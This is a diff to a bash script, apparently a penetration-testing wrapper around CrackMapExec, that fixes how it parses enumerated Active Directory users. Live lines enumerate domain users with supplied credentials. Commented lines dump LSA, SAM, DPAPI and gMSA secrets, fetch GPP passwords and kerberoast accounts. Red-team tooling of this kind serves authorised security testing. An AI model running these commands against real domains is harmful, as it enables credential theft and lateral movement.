@@ -34,7 +34,7 @@ LOGFILE=$1-lazycme.log
 # LOG='--log meep.log'
 # then crackmap blah blah $LOG
 
-#move config file to .bak; put new config with logging
+#install newest CME move config file to .bak; put new config with logging
 cd /opt
 git clone https://github.com/mpgn/CrackMapExec.git
 cd CrackMapExec 
@@ -53,6 +53,7 @@ echo ' '
 echo 'Output is also logged to command oriented text files AND ~/.cme/logs'
 echo ' '
 echo ' '
+
 
 ###############################################################################
 ###############################################################################
@@ -181,12 +182,12 @@ crackmapexec smb $3 -d $4 -u $1 -p $2 --users | tee unparsed-users.txt | tee -a 
 
 #this needs to be fixed
 echo 'Cleaning up users...'
-echo "Running: 'cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | sort | tee only-users.txt"
+echo "Running: 'cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 | cut -d ' ' -f 1 | sort | tee only-users.txt"
 cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 | cut -d ' ' -f 1 | sort | tee only-users.txt >> $LOGFILE
 sleep 3
 echo 'Getting domain\users'
-echo 'Running: cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 25 unparsed-users.txt | sort | tee domain-users.txt'
-cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 25 | sort | tee domain-users.txt >> $LOGFILE
+echo 'Running: cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 24 unparsed-users.txt | sort | tee domain-users.txt'
+cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d ' ' -f 24 | sort | tee domain-users.txt >> $LOGFILE
 
 echo ' '
 echo ' '
@@ -504,10 +505,6 @@ echo 'crackmapexec rdp ips domain user password'
 #put this in after testing
 # crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa --sam --dpapi --gmsa
 # crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --users --pass-pol
-# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 -M gpp_autologin gpp_password 
-# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --kerberoast kerberoasts.txt --asreproast asreproasts.txt
-# alias smb='crackmapexec smb $5 -d $4 -u $1 -p $2 ' 
-# alias ldap='crackmapexec ldap $5 -d $4 -u $1 -p $2 ' 
 # then gotta change EVERYTHING sadge
 
 
